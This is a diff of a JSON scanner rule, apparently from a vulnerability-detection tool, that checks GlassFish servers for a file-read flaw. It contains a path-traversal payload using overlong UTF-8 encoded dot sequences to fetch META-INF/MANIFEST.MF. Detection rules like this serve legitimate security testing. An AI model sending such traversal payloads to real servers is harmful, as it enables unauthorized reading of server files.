@@ -1,6 +1,11 @@
 {
-    "name":"GlassFish_File_Read",
+    "name": "GlassFish_File_Read",
     "method": "GET",
-    "suffix":"/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF",
-    "hits":["Manifest"]
+    "port": [
+        80
+    ],
+    "suffix": "/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF",
+    "hits": [
+        "Version"
+    ]
 }
